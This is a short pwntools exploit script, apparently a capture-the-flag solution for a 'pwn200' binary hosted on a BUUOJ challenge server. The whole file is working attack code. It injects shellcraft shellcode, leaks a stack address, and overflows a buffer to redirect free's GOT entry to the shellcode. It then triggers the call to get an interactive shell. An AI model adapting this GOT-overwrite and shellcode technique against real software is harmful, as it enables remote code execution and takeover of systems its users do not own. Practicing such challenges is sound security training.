from pwn import *


# p = process("./pwn200")
p = remote("node4.buuoj.cn", 29403)
pro = ELF("./pwn200")

free_g = pro.got["free"]
context(os="linux", arch="amd64")


# write shellcode and leak stack
code = asm(shellcraft.sh())
p.sendafter("who are u?\n", code)
info = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
print("leak: ", hex(info))
code_addr = info-0x50

p.sendlineafter("give me your id ~~?\n", str(1))

# alter free_got to shellcode addr
pad = p64(code_addr).ljust(0x38, b"\x00")
pad += p64(free_g)
p.sendafter("give me money~\n", pad)

# attack
p.sendlineafter("your choice : ", "2")

p.interactive()


